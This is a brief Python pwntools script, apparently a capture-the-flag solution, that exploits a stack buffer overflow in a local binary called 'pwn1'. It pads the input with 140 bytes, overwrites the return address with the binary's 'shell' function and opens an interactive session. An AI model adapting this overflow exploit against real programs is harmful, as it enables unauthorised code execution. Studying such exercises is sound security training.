from pwn import *

e = ELF('./pwn1')
p = process('./pwn1')

shell_addr = e.symbols['shell']

payload = 'A'*140
payload += p32(shell_addr)

print p.recvuntil('Tell me your name: ')
p.sendline(payload)
p.interactive()
print p.recv()